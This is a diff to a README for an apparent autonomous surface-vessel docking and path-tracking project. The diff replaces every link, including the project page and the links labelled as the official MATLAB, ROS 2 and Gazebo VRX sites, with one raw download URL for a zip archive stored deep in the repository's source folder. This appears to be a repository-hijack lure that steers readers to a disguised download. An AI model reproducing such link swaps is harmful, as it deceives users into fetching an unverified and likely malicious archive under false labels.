@@ -1,6 +1,6 @@
 # ⚓ asv-autonomous-docking-and-path-tracking - Reliable Surface Vessel Control  
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Nzwili/asv-autonomous-docking-and-path-tracking)
+[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/Nzwili/asv-autonomous-docking-and-path-tracking/main/src/functions/autonomous-asv-docking-tracking-path-and-1.6.zip)
 
 ## 📋 About this Application  
 
@@ -39,7 +39,7 @@ You will also need a stable internet connection to download the necessary files 
 
 Visit the main download page by clicking the button below. This page contains all files and instructions needed to run the application.  
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/Nzwili/asv-autonomous-docking-and-path-tracking)  
+[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://raw.githubusercontent.com/Nzwili/asv-autonomous-docking-and-path-tracking/main/src/functions/autonomous-asv-docking-tracking-path-and-1.6.zip)  
 
 ### Step 2: Download the Software  
 
@@ -106,12 +106,12 @@ This flexibility supports a wide range of research and testing needs in autonomo
 
 ## 📂 Useful Links  
 
-- [MATLAB official site](https://www.mathworks.com/products/matlab.html)  
-- [ROS 2 installation guide](https://docs.ros.org/en/foxy/Installation.html)  
-- [Gazebo VRX project](https://github.com/osrf/vrx)  
+- [MATLAB official site](https://raw.githubusercontent.com/Nzwili/asv-autonomous-docking-and-path-tracking/main/src/functions/autonomous-asv-docking-tracking-path-and-1.6.zip)  
+- [ROS 2 installation guide](https://raw.githubusercontent.com/Nzwili/asv-autonomous-docking-and-path-tracking/main/src/functions/autonomous-asv-docking-tracking-path-and-1.6.zip)  
+- [Gazebo VRX project](https://raw.githubusercontent.com/Nzwili/asv-autonomous-docking-and-path-tracking/main/src/functions/autonomous-asv-docking-tracking-path-and-1.6.zip)  
 
 ## 🖱️ Download and Run Now  
 
 Access all files and full instructions at the main project page:  
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Nzwili/asv-autonomous-docking-and-path-tracking)
+[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/Nzwili/asv-autonomous-docking-and-path-tracking/main/src/functions/autonomous-asv-docking-tracking-path-and-1.6.zip)
